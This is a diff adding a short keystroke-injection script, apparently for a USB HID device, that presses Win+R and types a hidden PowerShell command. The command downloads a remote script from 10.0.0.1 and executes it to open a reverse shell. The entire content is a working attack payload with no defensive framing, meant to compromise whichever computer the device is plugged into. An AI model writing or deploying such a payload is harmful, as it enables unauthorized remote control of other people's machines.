@@ -1,0 +1,5 @@
+# Simulate Win+R, open cmd, and reverse shell via PowerShell
+<GUI> r
+sleep 0.5
+powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://10.0.0.1/shell.ps1')"
+<ENTER>
